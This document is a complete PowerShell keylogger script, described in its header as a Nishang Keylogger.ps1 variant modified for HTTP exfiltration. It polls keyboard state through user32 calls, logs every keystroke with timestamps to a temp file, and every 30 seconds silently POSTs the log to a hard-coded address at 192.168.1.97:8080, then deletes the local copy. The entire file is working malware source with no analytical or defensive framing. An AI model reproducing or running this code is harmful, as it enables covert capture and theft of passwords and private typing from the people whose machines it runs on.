# Based on Nishang Keylogger.ps1 - Modified for HTTP exfiltration
Add-Type -AssemblyName System.Windows.Forms
$url = "http://192.168.1.97:8080/log"
$logFile = "$env:TEMP\kl.txt"

function Start-KeyLogger {
  $signatures = @'
  [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
  public static extern short GetAsyncKeyState(int virtualKeyCode);
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int GetKeyboardState(byte[] keystate);
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int MapVirtualKey(uint uCode, int uMapType);
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
  Add-Type -MemberDefinition $signatures -Name Win32 -Namespace API
  $lastCheck = Get-Date
  while ($true) {
    Start-Sleep -Milliseconds 40
    for ($char = 1; $char -le 254; $char++) {
      $state = [API.Win32]::GetAsyncKeyState($char)
      if ($state -eq -32767) {
        $key = [System.Windows.Forms.Keys]$char
        $keyChar = $key.ToString()
        if ($keyChar) {
          $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $keyChar"
          Add-Content -Path $logFile -Value $logEntry
        }
      }
    }
    # Exfiltrate every 30 seconds
    if ((Get-Date) - $lastCheck -gt [TimeSpan]::FromSeconds(30)) {
      if (Test-Path $logFile) {
        $logData = Get-Content -Path $logFile -Raw
        try {
          Invoke-WebRequest -Uri $url -Method POST -Body $logData -ErrorAction SilentlyContinue
          Remove-Item -Path $logFile -Force
        } catch {}
      }
      $lastCheck = Get-Date
    }
  }
}
Start-KeyLogger
